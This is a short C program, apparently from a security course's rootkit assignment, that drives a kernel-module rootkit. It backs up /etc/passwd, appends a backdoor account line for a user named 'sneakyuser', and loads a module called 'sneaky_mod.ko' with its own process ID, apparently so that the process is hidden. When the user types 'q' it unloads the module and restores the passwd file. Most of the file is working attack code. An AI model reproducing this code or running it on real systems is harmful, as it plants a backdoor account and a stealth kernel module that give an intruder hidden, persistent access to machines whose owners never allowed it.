#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

void errorExit(const char *info);

int main(void) {
  int succeed;

  // Print the current process ID
  printf("sneaky_process pid = %d\n", getpid());

  // Copy the /etc/passwd file to a new file: /tmp/passwd
  succeed = system("cp /etc/passwd /tmp/passwd");
  if (succeed == -1) {
    errorExit("system() failed: Cannot copy etc/passwd to /tmp/passwd");
  }

  // Add a new line to /etc/passwd
  succeed =
      system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> "
             "/etc/passwd");
  if (succeed == -1) {
    errorExit("system() failed: Cannot add a new line to /etc/passwd");
  }

  // Load the sneaky module: sneaky_mod.ko and pass in the current pid
  char command[50];
  memset(command, '\0', sizeof(command));
  sprintf(command, "%s%d", "insmod sneaky_mod.ko pid=", getpid());
  succeed = system(command);
  if (succeed == -1) {
    errorExit("system() failed: Cannot insmod sneaky_mod.ko");
  }

  // Loop to make time for testing
  while (fgetc(stdin) != 'q') {
  }

  // Unload the sneaky module: sneaky_mod.ko
  succeed = system("rmmod sneaky_mod.ko");
  if (succeed == -1) {
    errorExit("system() failed: Cannot rmmod sneaky_mod.ko");
  }

  // Restore /etc/passwd from /tmp/passwd
  succeed = system("mv /tmp/passwd /etc/passwd");
  if (succeed == -1) {
    errorExit("system() failed: Cannot restore /etc/passwd from /tmp/passwd");
  }
}

void errorExit(const char *info) {
  perror(info);
  exit(EXIT_FAILURE);
}
